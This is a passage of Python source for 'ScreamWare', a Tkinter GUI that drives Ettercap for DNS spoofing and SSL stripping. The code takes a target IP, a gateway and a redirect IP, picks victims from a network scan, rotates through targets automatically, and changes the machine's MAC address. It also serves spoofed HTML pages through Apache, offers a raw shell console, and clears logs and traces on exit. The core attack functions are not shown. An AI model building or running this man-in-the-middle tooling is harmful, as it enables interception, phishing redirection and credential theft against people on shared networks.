                f.write(f"Average Response: {ping_stats['avg_response']:.2f}ms\n" if ping_stats['avg_response'] > 0 else "Average Response: N/A\n")
                f.write(f"Min Response: {ping_stats['min_response']:.2f}ms\n" if ping_stats['min_response'] != float('inf') else "Min Response: N/A\n")
                f.write(f"Max Response: {ping_stats['max_response']:.2f}ms\n" if ping_stats['max_response'] > 0 else "Max Response: N/A\n\n")

                # Detailed results
                f.write("=== Detailed Results ===\n")
                for result in ping_history[-50:]:  # Last 50 results
                    status = "✅ UP" if result["success"] else "❌ DOWN"
                    response = f"{result['response_time']:.2f}ms" if result["response_time"] else "N/A"
                    f.write(f"{result['host']} - {status} - {response} - {result.get('packet_loss', 0)}% loss\n")

            log_output(f"📄 Ping results exported to {filename}", "success")
    except Exception as e:
        log_output(f"❌ Failed to export ping results: {e}", "error")

# Console functions
def execute_console_command():
    """Execute command from console entry"""
    command = console_command_entry.get().strip()
    if not command:
        return

    console_command_entry.delete(0, tk.END)

    # Display command
    console_output.insert(tk.END, f"$ {command}\n", "command")

    def output_callback(line):
        console_output.insert(tk.END, f"{line}\n", "output")
        console_output.see(tk.END)
        root.update_idletasks()

    # Execute command in thread
    def run_command():
        output, return_code = execute_command(command, output_callback)
        if return_code != 0:
            console_output.insert(tk.END, f"Command failed with exit code {return_code}\n", "error")

    threading.Thread(target=run_command, daemon=True).start()

def use_kali_command():
    """Use selected Kali command"""
    command = kali_commands_var.get()
    if command:
        console_command_entry.delete(0, tk.END)
        console_command_entry.insert(0, command)

# MISC tab functions
def execute_port_scan():
    """Execute port scan"""
    target = port_target_entry.get().strip()
    ports = port_range_entry.get().strip()
    scan_type = scan_type_var.get()

    if not target:
        messagebox.showwarning("No Target", "Please enter a target IP or hostname.", parent=root)
        return

    port_results_text.delete(1.0, tk.END)
    port_results_text.insert(tk.END, f"Scanning {target} ports {ports} ({scan_type})...\n\n", "info")

    def scan_thread():
        results = port_scan(target, ports, scan_type)
        root.after(0, lambda: display_port_results(results))

    threading.Thread(target=scan_thread, daemon=True).start()

def display_port_results(results):
    """Display port scan results"""
    port_results_text.insert(tk.END, f"Scan completed. Found {len(results)} open ports:\n\n", "success")

    for result in results:
        protocol = result.get('protocol', 'tcp')
        state = result.get('state', 'unknown')
        service = result.get('service', 'unknown')
        port = result.get('port', 'N/A')

        color_tag = "success" if state == "open" else "warning"
        port_results_text.insert(tk.END, f"Port {port}/{protocol} - {state} - {service}\n", color_tag)

def execute_whois():
    """Execute WHOIS lookup"""
    domain = whois_domain_entry.get().strip()
    if not domain:
        messagebox.showwarning("No Domain", "Please enter a domain name.", parent=root)
        return

    whois_results_text.delete(1.0, tk.END)
    whois_results_text.insert(tk.END, f"WHOIS lookup for {domain}...\n\n", "info")

    def whois_thread():
        result = whois_lookup(domain)
        root.after(0, lambda: whois_results_text.insert(tk.END, result))

    threading.Thread(target=whois_thread, daemon=True).start()

def execute_dns_lookup():
    """Execute DNS lookup"""
    domain = dns_domain_entry.get().strip()
    record_type = dns_record_var.get()

    if not domain:
        messagebox.showwarning("No Domain", "Please enter a domain name.", parent=root)
        return

    dns_results_text.delete(1.0, tk.END)
    dns_results_text.insert(tk.END, f"DNS lookup for {domain} ({record_type})...\n\n", "info")

    def dns_thread():
        result = dns_lookup(domain, record_type)
        root.after(0, lambda: dns_results_text.insert(tk.END, result))

    threading.Thread(target=dns_thread, daemon=True).start()

import threading
from tkinter import messagebox

def execute_mac_change(dry_run=False):
    """Execute MAC address change with optional dry run"""
    interface = mac_interface_var.get()
    new_mac = mac_entry.get().strip()

    if not interface or not new_mac:
        messagebox.showwarning("Missing Info", "Please enter both interface and MAC address.", parent=root)
        return

    mac_status_label.config(text="Changing...", fg="#fbbf24")

    def mac_thread():
        success = change_mac_address(interface, new_mac, dry_run=dry_run)
        if success:
            root.after(0, lambda: mac_status_label.config(text="Changed successfully", fg="#4ade80"))
        else:
            root.after(0, lambda: mac_status_label.config(text="Failed", fg="#f87171"))

    threading.Thread(target=mac_thread, daemon=True).start()

# -----------------------
# GUI build
# -----------------------
# Recreate Tk root in-case it was accessed earlier
try:
    root.destroy()
except Exception:
    pass
root = tk.Tk()
root.title("ScreamWare: DNS Spoofing Framework (Enhanced)")
root.geometry("1000x740")
root.configure(bg="#1e1e1e")
root.resizable(True, True)

style = ttk.Style()
try:
    style.theme_use('clam')
except Exception:
    pass
style.configure('TNotebook', background='#1e1e1e', borderwidth=0)
style.configure('TNotebook.Tab', background='#333', foreground='white', padding=[12, 8])
style.map('TNotebook.Tab', background=[('selected', '#444')])
style.configure('TTreeview', background='#333', foreground='white', fieldbackground='#333')
style.configure('TTreeview.Heading', background='#444', foreground='white')

# Title
title_frame = tk.Frame(root, bg="#1e1e1e")
title_frame.pack(pady=10)
title_label = tk.Label(title_frame, fg="#ff0040", bg="#1e1e1e", font=("Courier", 16, "bold"))
title_label.pack()
# simple reveal
def glitch_reveal(widget, text, delay=30):
    widget.config(text="")
    def reveal(i=0):
        if i < len(text):
            widget.config(text=widget.cget("text") + text[i])
            widget.after(delay, reveal, i+1)
    reveal()
glitch_reveal(title_label, "ScreamWare: DNS Spoofing Framework (Enhanced)")

# Notebook and tabs
notebook = ttk.Notebook(root)
notebook.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)

main_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(main_tab, text="Main")
discovery_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(discovery_tab, text="Network Discovery")
domain_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(domain_tab, text="Domain Management")
html_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(html_tab, text="HTML Lab")
monitor_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(monitor_tab, text="Monitor & Stats")
ping_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(ping_tab, text="Ping Tools")
console_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(console_tab, text="Console")
misc_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(misc_tab, text="MISC Tools")
credits_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(credits_tab, text="Credits")

# ---- Main tab layout ----
main_frame = tk.Frame(main_tab, bg="#1e1e1e")
main_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

def create_input_field(parent, label_text, default_value="", width=30):
    frame = tk.Frame(parent, bg="#1e1e1e")
    frame.pack(fill=tk.X, pady=5)
    label = tk.Label(frame, text=label_text, fg="white", bg="#1e1e1e", font=("Arial", 10), width=20, anchor="w")
    label.pack(side=tk.LEFT, padx=(0, 10))
    entry = tk.Entry(frame, width=width, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
    if default_value:
        entry.insert(0, default_value)
    return entry

target_entry = create_input_field(main_frame, "Target IP *:")
gateway_entry = create_input_field(main_frame, "Gateway IP *:")
spoof_ip_entry = create_input_field(main_frame, "Spoof Redirect IP *:")

options_frame = tk.Frame(main_frame, bg="#1e1e1e")
options_frame.pack(fill=tk.X, pady=10)

# Interface and plugin selection
iface_frame = tk.Frame(options_frame, bg="#1e1e1e")
iface_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
tk.Label(iface_frame, text="Interface:", fg="white", bg="#1e1e1e", font=("Arial", 10), width=12, anchor="w").pack(anchor="w")
iface_var = tk.StringVar(value="wlan0")
available_interfaces = get_network_interfaces()
iface_dropdown = ttk.Combobox(iface_frame, textvariable=iface_var, values=available_interfaces, state="readonly", width=15)
iface_dropdown.pack(fill=tk.X)

# Bind interface change event
iface_dropdown.bind("<<ComboboxSelected>>", lambda e: on_interface_change())
auto_ip_button = tk.Button(iface_frame, text="Auto-Detect IP", command=lambda: spoof_ip_entry.delete(0, tk.END) or spoof_ip_entry.insert(0, get_interface_ip(iface_var.get())), bg="#333", fg="white", font=("Arial", 9))
auto_ip_button.pack(pady=(5,0))

# Auto-detect Network button
auto_network_button = tk.Button(iface_frame, text="Auto-Detect Network", command=auto_populate_network_fields, bg="#ff6b35", fg="white", font=("Arial", 9))
auto_network_button.pack(pady=(5,0))

plugin_frame = tk.Frame(options_frame, bg="#1e1e1e")
plugin_frame.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))
tk.Label(plugin_frame, text="Plugin:", fg="white", bg="#1e1e1e", font=("Arial", 10), width=12, anchor="w").pack(anchor="w")
plugin_var = tk.StringVar(value="dns_spoof")
plugin_dropdown = ttk.Combobox(plugin_frame, textvariable=plugin_var, values=["dns_spoof", "remote_browser", "sslstrip"], state="readonly", width=15)
plugin_dropdown.pack(fill=tk.X)

# Control buttons
button_frame = tk.Frame(main_frame, bg="#1e1e1e")
button_frame.pack(fill=tk.X, pady=10)

launch_button = tk.Button(button_frame, text="Launch Ettercap", command=run_ettercap, bg="#0a7e3d", fg="white", font=("Arial", 10, "bold"), padx=20, pady=5, relief=tk.RAISED, bd=2)
launch_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(button_frame, text="Stop Ettercap", command=stop_ettercap, bg="#d32f2f", fg="white", font=("Arial", 10, "bold"), padx=20, pady=5, relief=tk.RAISED, bd=2)
stop_button.pack(side=tk.LEFT, padx=5)

# Auto-rotation toggle
rotation_button = tk.Button(button_frame, text="🔄 Auto-Rotate OFF", command=lambda: toggle_rotation_from_main(), bg="#444", fg="white", font=("Arial", 10), padx=15, pady=5, relief=tk.RAISED, bd=2)
rotation_button.pack(side=tk.LEFT, padx=5)

clear_button = tk.Button(button_frame, text="Clear Output", command=lambda: output_text.delete(1.0, tk.END) or log_output("Output cleared", "info"), bg="#666", fg="white", font=("Arial", 10), padx=20, pady=5, relief=tk.RAISED, bd=2)
clear_button.pack(side=tk.LEFT, padx=5)

save_config_button = tk.Button(button_frame, text="Save Config", command=save_config, bg="#444", fg="white", font=("Arial", 10), padx=20, pady=5, relief=tk.RAISED, bd=2)
save_config_button.pack(side=tk.LEFT, padx=5)

load_config_button = tk.Button(button_frame, text="Load Config", command=load_config, bg="#444", fg="white", font=("Arial", 10), padx=20, pady=5, relief=tk.RAISED, bd=2)
load_config_button.pack(side=tk.LEFT, padx=5)

export_button = tk.Button(button_frame, text="Export Logs", command=lambda: export_logs(), bg="#444", fg="white", font=("Arial", 10), padx=20, pady=5, relief=tk.RAISED, bd=2)
export_button.pack(side=tk.LEFT, padx=5)

search_button = tk.Button(button_frame, text="Search", command=run_search_script, bg="#1f6feb", fg="white", font=("Arial", 10), padx=20, pady=5, relief=tk.RAISED, bd=2)
search_button.pack(side=tk.LEFT, padx=5)

# install dependencies button (created here so _set_controls_enabled can reference it)
install_deps_button = tk.Button(button_frame, text="Install Missing Dependencies", command=lambda: install_missing_dependencies(["nmap", "ettercap", "sudo"]), bg="#1f6feb", fg="white", font=("Arial", 10), padx=10, pady=5)
install_deps_button.pack(side=tk.LEFT, padx=5)

# HTML Grabber URL input frame
search_input_frame = tk.Frame(main_frame, bg="#1e1e1e")
search_input_frame.pack(fill=tk.X, pady=5)

tk.Label(search_input_frame, text="HTML Grabber:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=5)
tk.Label(search_input_frame, text="URL:", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=2)

search_url_var = tk.StringVar(value="example.com")
search_url_entry = tk.Entry(search_input_frame, textvariable=search_url_var, bg="#2d2d2d", fg="white", font=("Arial", 10), width=25)
search_url_entry.pack(side=tk.LEFT, padx=5)

download_resources_var = tk.BooleanVar(value=False)
download_resources_check = tk.Checkbutton(search_input_frame, text="Download CSS/JS", variable=download_resources_var,
                                         bg="#1e1e1e", fg="white", selectcolor="#2d2d2d", activebackground="#1e1e1e", activeforeground="white")
download_resources_check.pack(side=tk.LEFT, padx=5)

# Output area
output_frame = tk.Frame(main_frame, bg="#1e1e1e")
output_frame.pack(fill=tk.BOTH, expand=True, pady=10)
tk.Label(output_frame, text="Output Log:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(anchor="w")
output_text = scrolledtext.ScrolledText(output_frame, height=14, bg="#0d1117", fg="#c9d1d9", font=("Courier", 9), wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
output_text.pack(fill=tk.BOTH, expand=True)

# text tags
output_text.tag_configure("success", foreground="#4ade80")
output_text.tag_configure("error", foreground="#f87171")
output_text.tag_configure("warning", foreground="#fbbf24")
output_text.tag_configure("info", foreground="#60a5fa")
output_text.tag_configure("output", foreground="#e5e7eb")

# status bar
status_frame = tk.Frame(root, bg="#0d1117", height=25)
status_frame.pack(fill=tk.X, side=tk.BOTTOM)
status_frame.pack_propagate(False)
status_label = tk.Label(status_frame, text="Ready", fg="#4ade80", bg="#0d1117", font=("Arial", 9), anchor="w")
status_label.pack(side=tk.LEFT, padx=10, pady=2)

# ---- Discovery tab ----
discovery_frame = tk.Frame(discovery_tab, bg="#1e1e1e")
discovery_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)
scan_input_frame = tk.Frame(discovery_frame, bg="#1e1e1e")
scan_input_frame.pack(fill=tk.X, pady=10)
tk.Label(scan_input_frame, text="Network Range:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
network_entry = tk.Entry(scan_input_frame, width=30, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
network_entry.pack(side=tk.LEFT, padx=(0, 10))
network_entry.insert(0, "192.168.1.0/24")

# Auto-detect Network Range button
auto_discovery_button = tk.Button(scan_input_frame, text="Auto-Detect", command=auto_populate_network_fields, bg="#ff6b35", fg="white", font=("Arial", 10), padx=15, pady=5)
auto_discovery_button.pack(side=tk.LEFT, padx=5)

scan_button = tk.Button(scan_input_frame, text="Scan Network", command=lambda: threading.Thread(target=lambda: scan_network(network_entry.get()), daemon=True).start(), bg="#0a7e3d", fg="white", font=("Arial", 10, "bold"), padx=20, pady=5)
scan_button.pack(side=tk.LEFT)

results_frame = tk.Frame(discovery_frame, bg="#1e1e1e")
results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
tk.Label(results_frame, text="Discovered Hosts:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(anchor="w")
tree_frame = tk.Frame(results_frame, bg="#1e1e1e")
tree_frame.pack(fill=tk.BOTH, expand=True)
scan_results_tree = ttk.Treeview(tree_frame, columns=("IP", "Hostname"), show="headings", height=12)
scan_results_tree.heading("IP", text="IP Address")
scan_results_tree.heading("Hostname", text="Hostname")
scan_results_tree.column("IP", width=150)
scan_results_tree.column("Hostname", width=200)
scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=scan_results_tree.yview)
scan_results_tree.configure(yscrollcommand=scrollbar.set)
scan_results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

def on_host_double_click(event):
    selection = scan_results_tree.selection()
    if selection:
        item = scan_results_tree.item(selection[0])
        ip = item['values'][0]
        if not target_entry.get():
            target_entry.delete(0, tk.END)
            target_entry.insert(0, ip)
            log_output(f"🎯 Selected target: {ip}", "info")
        elif not gateway_entry.get() and ip != target_entry.get():
            gateway_entry.delete(0, tk.END)
            gateway_entry.insert(0, ip)
            log_output(f"🌐 Selected gateway: {ip}", "info")
        else:
            target_entry.delete(0, tk.END)
            target_entry.insert(0, ip)
            log_output(f"🎯 New target: {ip}", "info")

scan_results_tree.bind("<Double-1>", on_host_double_click)

# ---- Domain tab ----
domain_mgmt_frame = tk.Frame(domain_tab, bg="#1e1e1e")
domain_mgmt_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)
add_domain_frame = tk.Frame(domain_mgmt_frame, bg="#1e1e1e")
add_domain_frame.pack(fill=tk.X, pady=10)
tk.Label(add_domain_frame, text="Add Domain:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
domain_entry = tk.Entry(add_domain_frame, width=30, bg="#333", fg="white", insertbackground="white", font=("Arial", 10))
domain_entry.pack(side=tk.LEFT, padx=(0, 10))
add_domain_button = tk.Button(add_domain_frame, text="Add Domain", command=add_domain, bg="#0a7e3d", fg="white", font=("Arial", 10), padx=20, pady=5)
add_domain_button.pack(side=tk.LEFT)
domain_list_frame = tk.Frame(domain_mgmt_frame, bg="#1e1e1e")
domain_list_frame.pack(fill=tk.BOTH, expand=True, pady=10)
tk.Label(domain_list_frame, text="Spoof Domains:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(anchor="w")
list_frame = tk.Frame(domain_list_frame, bg="#1e1e1e")
list_frame.pack(fill=tk.BOTH, expand=True)
domain_scrollbar = tk.Scrollbar(list_frame)
domain_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
domain_listbox = tk.Listbox(list_frame, bg="#333", fg="white", yscrollcommand=domain_scrollbar.set, font=("Arial", 10), height=15)
domain_listbox.pack(fill=tk.BOTH, expand=True)
domain_scrollbar.config(command=domain_listbox.yview)
remove_domain_button = tk.Button(domain_list_frame, text="Remove Selected Domain", command=remove_domain, bg="#d32f2f", fg="white", font=("Arial", 10), padx=20, pady=5)
remove_domain_button.pack(pady=(10, 0))
update_domain_list()

# ---- HTML Lab tab ----
ensure_html_lab()
left_panel = tk.Frame(html_tab, bg="#1e1e1e", width=260)
left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
tk.Label(left_panel, text="HTML Lab Files:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(anchor="w")
file_listbox = tk.Listbox(left_panel, bg="#333", fg="white", width=34, height=24)
file_listbox.pack(fill=tk.Y, expand=True, pady=(5,0))

# Apache status tracking
apache_status = {"running": False}

def preview_via_apache():
    """Start Apache if needed and open selected HTML file in browser via Apache"""
    sel = file_listbox.curselection()
    if not sel:
        messagebox.showinfo("No File Selected", "Please select an HTML file from the list first.", parent=root)
        return

    fname = file_listbox.get(sel[0])
    apache_url = f"http://{local_ip}/{fname}"

    def start_and_preview():
        # Check if we're on Windows
        import platform
        is_windows = platform.system() == "Windows"

        if not is_windows:
            # First check if Apache is running (Linux/Mac)
            try:
                result = subprocess.run(['systemctl', 'is-active', 'apache2'],
                                      capture_output=True, text=True, timeout=5)
                apache_running = result.returncode == 0
            except (subprocess.TimeoutExpired, FileNotFoundError):
                # Fallback: try service command
                try:
                    result = subprocess.run(['service', 'apache2', 'status'],
                                          capture_output=True, text=True, timeout=5)
                    apache_running = 'running' in result.stdout.lower()
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    apache_running = False

            if not apache_running:
                log_output("🔧 Apache not running - Please start Apache manually", "info")
                messagebox.showinfo("Apache Required",
                    "Apache is not running. Please start Apache manually and try again.", parent=root)
                return
        else:
            log_output("⚠️ Apache preview not fully supported on Windows", "warning")
            messagebox.showinfo("Windows Notice",
                "Apache integration is limited on Windows. Please ensure your web server is running.", parent=root)

        # Open the file in browser
        try:
            log_output(f"🌐 Opening {fname} via Apache: {apache_url}", "info")
            webbrowser.open(apache_url)
            log_output("✅ File opened in browser", "success")
        except Exception as e:
            log_output(f"❌ Failed to open browser: {e}", "error")

    # Run in thread to avoid freezing GUI
    threading.Thread(target=start_and_preview, daemon=True).start()

def refresh_file_list():
    file_listbox.delete(0, tk.END)
    try:
        for p in sorted(HTML_LAB_DIR.glob("*.html")):
            file_listbox.insert(tk.END, p.name)
    except Exception as e:
        log_output(f"❌ Could not list HTML lab files: {e}", "error")

def load_selected_file(event=None):
    sel = file_listbox.curselection()
    if not sel:
        return
    fname = file_listbox.get(sel[0])
    path = HTML_LAB_DIR / fname
    try:
        txt = path.read_text(encoding="utf-8")
        html_editor.delete(1.0, tk.END)
        html_editor.insert(tk.END, txt)
        log_output(f"📂 Loaded {fname}", "info")
    except Exception as e:
        log_output(f"❌ Failed to load {fname}: {e}", "error")

file_listbox.bind("<<ListboxSelect>>", load_selected_file)

# Double-click to preview via Apache
def on_file_double_click(event):
    preview_via_apache()

file_listbox.bind("<Double-1>", on_file_double_click)

file_buttons = tk.Frame(left_panel, bg="#1e1e1e")
file_buttons.pack(fill=tk.X, pady=6)
tk.Button(file_buttons, text="New", command=lambda: create_new_file(), bg="#0a7e3d", fg="white", width=8).pack(side=tk.LEFT, padx=2)
tk.Button(file_buttons, text="Delete", command=lambda: delete_selected_file(), bg="#d32f2f", fg="white", width=8).pack(side=tk.LEFT, padx=2)
tk.Button(file_buttons, text="Refresh", command=refresh_file_list, bg="#444", fg="white", width=8).pack(side=tk.LEFT, padx=2)

editor_frame = tk.Frame(html_tab, bg="#1e1e1e")
editor_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
tk.Label(editor_frame, text="Editor:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(anchor="w")
html_editor = scrolledtext.ScrolledText(editor_frame, wrap=tk.NONE, bg="#0d1117", fg="#c9d1d9", font=("Courier", 10), height=28)
html_editor.pack(fill=tk.BOTH, expand=True)

editor_controls = tk.Frame(editor_frame, bg="#1e1e1e")
editor_controls.pack(fill=tk.X, pady=6)
tk.Button(editor_controls, text="Save", command=lambda: save_current_file(), bg="#0a7e3d", fg="white", width=10).pack(side=tk.LEFT, padx=2)
tk.Button(editor_controls, text="Start Server", command=start_html_server, bg="#1f6feb", fg="white", width=12).pack(side=tk.LEFT, padx=2)
tk.Button(editor_controls, text="Stop Server", command=stop_html_server, bg="#d32f2f", fg="white", width=10).pack(side=tk.LEFT, padx=2)
tk.Button(editor_controls, text="Open in Browser", command=open_lab_in_browser, bg="#444", fg="white", width=12).pack(side=tk.LEFT, padx=2)
tk.Button(editor_controls, text="Preview via Apache", command=preview_via_apache, bg="#ff6b35", fg="white", width=14, font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=6)
tk.Button(editor_controls, text="Start Apache", command=start_apache_host, bg="#1f6feb", fg="white", width=12).pack(side=tk.LEFT, padx=2)
tk.Button(editor_controls, text="Stop Apache", command=stop_apache_host, bg="#d32f2f", fg="white", width=12).pack(side=tk.LEFT, padx=2)

def save_current_file():
    sel = file_listbox.curselection()
    if not sel:
        messagebox.showinfo("Save", "Select a file from the list or create a new file first.")
        return
    fname = file_listbox.get(sel[0])
    path = HTML_LAB_DIR / fname
    try:
        path.write_text(html_editor.get(1.0, tk.END), encoding="utf-8")
        log_output(f"💾 Saved {fname}", "success")
    except Exception as e:
        log_output(f"❌ Failed to save {fname}: {e}", "error")

def create_new_file():
    name = simpledialog.askstring("New File", "Enter new filename (example: demo.html):", parent=root)
    if not name:
        return
    if not name.endswith(".html"):
        name += ".html"
    path = HTML_LAB_DIR / name
    if path.exists():
        messagebox.showwarning("Exists", "That file already exists.")
        return
    try:
        path.write_text("<!doctype html>\n<html><head><meta charset='utf-8'><title>New File</title></head><body>\n\n</body></html>", encoding="utf-8")
        refresh_file_list()
        log_output(f"➕ Created {name}", "success")
    except Exception as e:
        log_output(f"❌ Failed to create {name}: {e}", "error")

def delete_selected_file():
    sel = file_listbox.curselection()
    if not sel:
        return
    fname = file_listbox.get(sel[0])
    path = HTML_LAB_DIR / fname
    if messagebox.askyesno("Delete", f"Delete {fname}? This cannot be undone.", parent=root):
        try:
            path.unlink()
            refresh_file_list()
            html_editor.delete(1.0, tk.END)
            log_output(f"🗑️ Deleted {fname}", "warning")
        except Exception as e:
            log_output(f"❌ Failed to delete {fname}: {e}", "error")

refresh_file_list()
if file_listbox.size() > 0:
    file_listbox.selection_set(0)
    load_selected_file()

# ---- Monitor & Stats tab ----
monitor_frame = tk.Frame(monitor_tab, bg="#1e1e1e")
monitor_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Statistics Panel
stats_panel = tk.LabelFrame(monitor_frame, text="📊 Session Statistics", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
stats_panel.pack(fill=tk.X, pady=10)

# Store stat labels for updating
root.stat_labels = {}

# Create statistics grid
stats_grid = tk.Frame(stats_panel, bg="#1e1e1e")
stats_grid.pack(padx=10, pady=10)

stats_items = [
    ("Total Requests:", "total", "📡"),
    ("Successful:", "success", "✅"),
    ("Failed:", "failed", "❌"),
    ("Success Rate:", "rate", "📈"),
    ("Active Targets:", "active", "🎯"),
    ("Session Time:", "duration", "⏱️")
]

for i, (label_text, key, icon) in enumerate(stats_items):
    row = i // 3
    col = (i % 3) * 2

    # Icon + Label
    label = tk.Label(stats_grid, text=f"{icon} {label_text}", fg="white", bg="#1e1e1e", font=("Arial", 10))
    label.grid(row=row, column=col, sticky="w", padx=5, pady=2)

    # Value
    value_label = tk.Label(stats_grid, text="0", fg="#4ade80", bg="#1e1e1e", font=("Arial", 10, "bold"))
    value_label.grid(row=row, column=col+1, sticky="w", padx=5, pady=2)
    root.stat_labels[key] = value_label

# Target Rotation Panel
rotation_panel = tk.LabelFrame(monitor_frame, text="🔄 Target Rotation", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
rotation_panel.pack(fill=tk.X, pady=10)

rotation_controls = tk.Frame(rotation_panel, bg="#1e1e1e")
rotation_controls.pack(padx=10, pady=10)

tk.Label(rotation_controls, text="Interval (seconds):", fg="white", bg="#1e1e1e", font=("Arial", 10)).pack(side=tk.LEFT, padx=(0, 10))

interval_var = tk.IntVar(value=300)
interval_slider = tk.Scale(rotation_controls, from_=30, to=1800, orient=tk.HORIZONTAL,
                          variable=interval_var, command=update_rotation_interval,
                          bg="#333", fg="white", highlightthickness=0, length=200)
interval_slider.pack(side=tk.LEFT, padx=5)

tk.Button(rotation_controls, text="Start Rotation", command=start_target_rotation,
          bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=10)
tk.Button(rotation_controls, text="Stop Rotation", command=stop_target_rotation,
          bg="#d32f2f", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Traffic Monitor Panel
traffic_panel = tk.LabelFrame(monitor_frame, text="📡 Traffic Monitor", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
traffic_panel.pack(fill=tk.X, pady=10)

traffic_controls = tk.Frame(traffic_panel, bg="#1e1e1e")
traffic_controls.pack(padx=10, pady=5)

tk.Button(traffic_controls, text="Start Monitor", command=start_traffic_monitor,
          bg="#0a7e3d", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(traffic_controls, text="Stop Monitor", command=stop_traffic_monitor,
          bg="#d32f2f", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)
tk.Button(traffic_controls, text="Export Report", command=export_stats_report,
          bg="#444", fg="white", font=("Arial", 10), padx=15, pady=5).pack(side=tk.LEFT, padx=5)

# Traffic log display
traffic_log_frame = tk.Frame(traffic_panel, bg="#1e1e1e")
traffic_log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

tk.Label(traffic_log_frame, text="Recent Activity:", fg="white", bg="#1e1e1e", font=("Arial", 10, "bold")).pack(anchor="w")

traffic_text = scrolledtext.ScrolledText(traffic_log_frame, height=8, bg="#0d1117",
                                        fg="#c9d1d9", font=("Courier", 9),
                                        wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
traffic_text.pack(fill=tk.BOTH, expand=True)

# Target Status Panel
target_status_panel = tk.LabelFrame(monitor_frame, text="🎯 Target Status", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
target_status_panel.pack(fill=tk.BOTH, expand=True, pady=10)

target_status_frame = tk.Frame(target_status_panel, bg="#1e1e1e")
target_status_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

# Target status treeview
target_status_tree = ttk.Treeview(target_status_frame, columns=("Status", "Activity", "Rotations"), show="tree headings", height=6)
target_status_tree.heading("#0", text="Target IP")
target_status_tree.heading("Status", text="Status")
target_status_tree.heading("Activity", text="Last Activity")
target_status_tree.heading("Rotations", text="Rotations")

target_status_tree.column("#0", width=150)
target_status_tree.column("Status", width=80)
target_status_tree.column("Activity", width=100)
target_status_tree.column("Rotations", width=80)

target_scrollbar = ttk.Scrollbar(target_status_frame, orient=tk.VERTICAL, command=target_status_tree.yview)
target_status_tree.configure(yscrollcommand=target_scrollbar.set)

target_status_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
target_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

# Cleanup Automation Panel
cleanup_panel = tk.LabelFrame(monitor_frame, text="🧹 Cleanup Automation", fg="white", bg="#1e1e1e", font=("Arial", 12, "bold"))
cleanup_panel.pack(fill=tk.X, pady=10)

cleanup_controls = tk.Frame(cleanup_panel, bg="#1e1e1e")
cleanup_controls.pack(padx=10, pady=10)

# Auto cleanup checkbox
auto_cleanup_var = tk.BooleanVar(value=cleanup_config["auto_cleanup"])
auto_cleanup_check = tk.Checkbutton(cleanup_controls, text="Auto cleanup on exit",
                                   variable=auto_cleanup_var, command=toggle_auto_cleanup,
                                   fg="white", bg="#1e1e1e", selectcolor="#1e1e1e",
                                   font=("Arial", 10))
auto_cleanup_check.pack(anchor="w", pady=5)

# Cleanup options
cleanup_options_frame = tk.Frame(cleanup_controls, bg="#1e1e1e")
cleanup_options_frame.pack(fill=tk.X, pady=5)

cleanup_vars = {}
cleanup_options = [
    ("Clear ettercap", "clear_ettercap"),
    ("Clear DNS cache", "clear_dns_cache"),
    ("Clear temp files", "clear_temp_files"),
    ("Reset network", "reset_network")
]

for i, (label, key) in enumerate(cleanup_options):
    var = tk.BooleanVar(value=cleanup_config[key])
    cleanup_vars[key] = var
    cb = tk.Checkbutton(cleanup_options_frame, text=label, variable=var,
